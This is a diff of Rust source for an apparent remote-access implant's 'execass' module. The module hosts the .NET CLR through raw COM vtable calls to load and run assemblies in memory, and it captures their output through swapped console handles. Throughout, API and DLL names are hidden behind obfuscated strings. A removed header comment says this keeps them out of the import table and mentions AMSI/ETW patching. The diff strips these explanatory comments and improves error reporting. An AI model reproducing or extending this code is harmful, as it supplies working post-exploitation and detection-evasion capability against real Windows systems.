@@ -1,8 +1,3 @@
-// execass subsystem: Windows-only .NET assembly runner, a faithful port of
-// the Go execass engine (request.go + runner_windows.go + helper_windows.go)
-// including the go-clr COM hosting chain, AMSI/ETW patching, and stdout/stderr
-// redirection. All API/DLL names are resolved at runtime from obfuscated
-// strings, so nothing sensitive lands in the import table or .rodata.
 
 use crate::md::Manifest;
 
@@ -174,8 +169,6 @@ fn hex_encode(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02x}", b)).collect()
 }
 
-// shlex-style split for assembly arguments (quotes and # comments, close to
-// google/shlex used by the Go engine).
 pub fn shlex_split(input: &str) -> Result<Vec<String>, String> {
     let mut args = Vec::new();
     let mut current = String::new();
@@ -280,7 +273,6 @@ fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
     Ok(out)
 }
 
-// Minimal JSON for the helper protocol (fixed known shape, obfuscated keys).
 fn helper_request_json(artifact_b64: &str, runtime: &str, assembly_args: &str, debug: bool) -> String {
     let escape = |v: &str| v.replace('\\', "\\\\").replace('"', "\\\"");
     format!(
@@ -483,8 +475,6 @@ impl WindowsSpawnExt for std::process::Command {
     }
 }
 
-/// Helper entry point: `svc --wrssh-execass-helper` reads a JSON request from
-/// stdin, hosts the CLR, executes the assembly, prints captured output.
 #[cfg(target_os = "windows")]
 pub fn run_helper() -> i32 {
     use std::io::Read;
@@ -540,9 +530,6 @@ pub fn run_helper() -> i32 {
     0
 }
 
-// ---------------------------------------------------------------------------
-// CLR hosting (port of Ne0nd0g/go-clr subset used by the Go engine)
-// ---------------------------------------------------------------------------
 
 #[cfg(target_os = "windows")]
 pub mod clr {
@@ -653,8 +640,6 @@ pub mod clr {
         *vtable.add(index)
     }
 
-    // Each COM call below transmutes an explicit function signature from
-    // the interface vtable slot, mirroring go-clr's slot layout.
 
     struct HostState {
         metahost: Raw,
@@ -736,8 +721,6 @@ pub mod clr {
     }
 
     unsafe fn redirect_output() -> Result<(), String> {
-        // Ensure a console exists (hidden), then point the process
-        // STDOUT/STDERR handles at fresh pipes we can drain.
         let kernel32 = crate::ob!("kernel32.dll");
         let get_console_window: unsafe extern "system" fn() -> Raw =
             std::mem::transmute(resolve(&kernel32, &crate::ob!("GetConsoleWindow"))?);
@@ -763,15 +746,13 @@ pub mod clr {
 
         let get_std_handle: unsafe extern "system" fn(i32) -> Raw =
             std::mem::transmute(resolve(&kernel32, &crate::ob!("GetStdHandle"))?);
-        // Grab the real console/ssh handles before swapping so Rust-side output
-        // keeps flowing to the operator (Go caches these at runtime startup).
         ORIG_STDOUT = get_std_handle(-11);
         ORIG_STDERR = get_std_handle(-12);
 
         let set_std_handle: unsafe extern "system" fn(i32, Raw) -> i32 =
             std::mem::transmute(resolve(&kernel32, &crate::ob!("SetStdHandle"))?);
-        set_std_handle(-11, stdout_write); // STD_OUTPUT_HANDLE
-        set_std_handle(-12, stderr_write); // STD_ERROR_HANDLE
+        set_std_handle(-11, stdout_write);
+        set_std_handle(-12, stderr_write);
 
         STDOUT_BUFFER = Some(std::sync::Mutex::new(Vec::new()));
         STDERR_BUFFER = Some(std::sync::Mutex::new(Vec::new()));
@@ -817,8 +798,6 @@ pub mod clr {
             return Err(crate::ob!("there was an error enumerating the installed CLR runtimes").to_string());
         }
 
-        // EnumerateInstalledRuntimes (slot 5) -> IEnumUnknown, pick the first
-        // runtime containing the target version, else the last one.
         let enumerate: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
             std::mem::transmute::<Raw, _>(slot(metahost, 5));
         let mut enumerator: Raw = std::ptr::null_mut();
@@ -839,7 +818,7 @@ pub mod clr {
             }
             let mut length: u32 = 0;
             let version_string: unsafe extern "system" fn(Raw, *mut u16, *mut u32) -> Hresult =
-                std::mem::transmute::<Raw, _>(slot(element, 3)); // ICLRRuntimeInfo::GetVersionString
+                std::mem::transmute::<Raw, _>(slot(element, 3));
             version_string(element, std::ptr::null_mut(), &mut length);
             let mut buffer = vec![0u16; length as usize + 1];
             if version_string(element, buffer.as_mut_ptr(), &mut length) == 0 {
@@ -855,7 +834,6 @@ pub mod clr {
             return Err(crate::ob!("no CLR runtimes installed").to_string());
         }
 
-        // ICLRMetaHost::GetRuntime (slot 3) with the selected version.
         let get_runtime: unsafe extern "system" fn(Raw, *const u16, *const Guid, *mut Raw) -> Hresult =
             std::mem::transmute::<Raw, _>(slot(metahost, 3));
         let wide_version = wide(&latest_version);
@@ -864,7 +842,6 @@ pub mod clr {
             return Err(format!("{}{}", crate::ob!("failed to get runtime "), latest_version));
         }
 
-        // ICLRRuntimeInfo::GetInterface (slot 9) -> legacy ICorRuntimeHost.
         let get_interface: unsafe extern "system" fn(Raw, *const Guid, *const Guid, *mut Raw) -> Hresult =
             std::mem::transmute::<Raw, _>(slot(runtime_info, 9));
         let mut host: Raw = std::ptr::null_mut();
@@ -872,7 +849,6 @@ pub mod clr {
             return Err(crate::ob!("failed to get the runtime host").to_string());
         }
 
-        // ICorRuntimeHost::Start (slot 10).
         let start: unsafe extern "system" fn(Raw) -> Hresult = std::mem::transmute::<Raw, _>(slot(host, 10));
         if start(host) != 0 {
             return Err(crate::ob!("failed to start the runtime host").to_string());
@@ -889,7 +865,6 @@ pub mod clr {
         }
     }
 
-    // SafeArray helpers through oleaut32.
     unsafe fn safe_array_create_vector(element_type: u16, count: u32) -> Result<Raw, String> {
         let create: unsafe extern "system" fn(u16, i32, u32) -> Raw =
             std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayCreateVector"))?);
@@ -901,10 +876,11 @@ pub mod clr {
     }
 
     unsafe fn safe_array_put_element(array: Raw, index: i32, value: *mut c_void) -> Result<(), String> {
-        let put: unsafe extern "system" fn(Raw, i32, *mut c_void) -> Hresult =
+        let put: unsafe extern "system" fn(Raw, *const i32, *mut c_void) -> Hresult =
             std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayPutElement"))?);
-        if put(array, index, value) != 0 {
-            return Err(crate::ob!("SafeArrayPutElement failed").to_string());
+        let hr = put(array, &index, value);
+        if hr != 0 {
+            return Err(format!("{} 0x{:08x} idx={}", crate::ob!("SafeArrayPutElement failed"), hr as u32, index));
         }
         Ok(())
     }
@@ -946,7 +922,8 @@ pub mod clr {
         let string_array = safe_array_create_vector(VT_BSTR, params.len() as u32)?;
         for (index, param) in params.iter().enumerate() {
             let bstr = sys_alloc_string(param);
-            if let Err(error) = safe_array_put_element(string_array, index as i32, bstr) {
+            if let Err(mut error) = safe_array_put_element(string_array, index as i32, bstr) {
+                error = format!("{} [bstr]", error);
                 safe_array_destroy(string_array);
                 return Err(error);
             }
@@ -958,7 +935,8 @@ pub mod clr {
             extra: [0; 8],
         };
         let outer = safe_array_create_vector(VT_VARIANT, 1)?;
-        if let Err(error) = safe_array_put_element(outer, 0, &mut param_variant as *mut Variant as *mut c_void) {
+        if let Err(mut error) = safe_array_put_element(outer, 0, &mut param_variant as *mut Variant as *mut c_void) {
+            error = format!("{} [variant]", error);
             safe_array_destroy(outer);
             safe_array_destroy(string_array);
             return Err(error);
@@ -1001,6 +979,30 @@ pub mod clr {
         format!("0x{:08x}", hr as u32)
     }
 
+    unsafe fn error_info_description() -> String {
+        let Ok(get_err) = resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("GetErrorInfo")) else {
+            return String::new();
+        };
+        let get_error_info: unsafe extern "system" fn(u32, *mut Raw) -> Hresult =
+            std::mem::transmute(get_err);
+        let mut error_info: Raw = std::ptr::null_mut();
+        if get_error_info(0, &mut error_info) != 0 || error_info.is_null() {
+            return String::new();
+        }
+        let get_description: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
+            std::mem::transmute::<Raw, _>(slot(error_info, 3));
+        let mut description: Raw = std::ptr::null_mut();
+        if get_description(error_info, &mut description) != 0 || description.is_null() {
+            return String::new();
+        }
+        let text = read_wide(description as *const u16);
+        if text.is_empty() {
+            String::new()
+        } else {
+            format!(": {}", text)
+        }
+    }
+
     pub fn invoke_in_process(request: &super::Request, parsed_args: &[String]) -> (String, String) {
         unsafe {
             let dbg = request.debug;
@@ -1027,7 +1029,6 @@ pub mod clr {
                 step(dbg, &crate::ob!("output redirected").to_string());
             }
 
-            // ICorRuntimeHost::GetDefaultDomain (slot 13) -> _AppDomain.
             let get_default_domain: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(state.host, 13));
             let mut app_domain: Raw = std::ptr::null_mut();
@@ -1037,9 +1038,6 @@ pub mod clr {
                 return (String::new(), crate::ob!("failed to get the default app domain").to_string());
             }
 
-            // GetDefaultDomain yields an IUnknown; QueryInterface it to the
-            // _AppDomain dispatch interface before using its vtable slots
-            // (go-clr does the same, otherwise Load_3 faults inside clr.dll).
             let query_interface: unsafe extern "system" fn(Raw, *const Guid, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(app_domain, 0));
             let mut domain: Raw = std::ptr::null_mut();
@@ -1056,7 +1054,6 @@ pub mod clr {
                 Err(error) => return (String::new(), error),
             };
             step(dbg, "safearray created");
-            // _AppDomain::Load_3 (slot 45) -> Assembly.
             step(dbg, "calling Load_3");
             let load_3: unsafe extern "system" fn(Raw, Raw, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(app_domain, 45));
@@ -1068,7 +1065,6 @@ pub mod clr {
                 return (String::new(), crate::ob!("failed to load assembly").to_string());
             }
 
-            // _Assembly::GetEntryPoint (slot 16) -> MethodInfo.
             let get_entry_point: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(assembly, 16));
             let mut method_info: Raw = std::ptr::null_mut();
@@ -1078,7 +1074,6 @@ pub mod clr {
                 return (String::new(), crate::ob!("failed to get the assembly entry point").to_string());
             }
 
-            // MethodInfo::get_ToString (slot 7) for the signature check.
             let to_string: unsafe extern "system" fn(Raw, *mut *const u16) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(method_info, 7));
             let mut signature_ptr: *const u16 = std::ptr::null();
@@ -1093,25 +1088,34 @@ pub mod clr {
 
             let mut param_array: Raw = std::ptr::null_mut();
             if !signature.contains("Void Main()") {
-                if let Ok(array) = prepare_parameters(parsed_args) {
-                    param_array = array;
+                match prepare_parameters(parsed_args) {
+                    Ok(array) => param_array = array,
+                    Err(error) => {
+                        step(dbg, &format!("prepare_parameters failed: {}", error));
+                        return (String::new(), format!("{}{}", crate::ob!("failed to prepare parameters: "), error));
+                    }
                 }
+                step(dbg, "parameters prepared");
             }
 
             let null_variant = Variant {
-                vt: 1, // VT_NULL, matching go-clr
+                vt: 1,
                 reserved: [0; 3],
                 value: 0,
                 extra: [0; 8],
             };
-            // MethodInfo::Invoke_3 (slot 37).
-            let invoke_3: unsafe extern "system" fn(Raw, Variant, Raw) -> Hresult =
+            let invoke_3: unsafe extern "system" fn(Raw, Variant, Raw, usize) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(method_info, 37));
-            let hr = invoke_3(method_info, null_variant, param_array);
+            let hr = invoke_3(method_info, null_variant, param_array, 0);
             step(dbg, &format!("Invoke_3 hr={}", hr_text(hr)));
             let mut invoke_error = String::new();
             if hr != 0 {
-                invoke_error = crate::ob!("the MethodInfo::Invoke_3 method returned an error").to_string();
+                invoke_error = format!(
+                    "{} {}{}",
+                    crate::ob!("the MethodInfo::Invoke_3 method returned an error"),
+                    hr_text(hr),
+                    error_info_description()
+                );
             }
             safe_array_destroy(param_array);
 
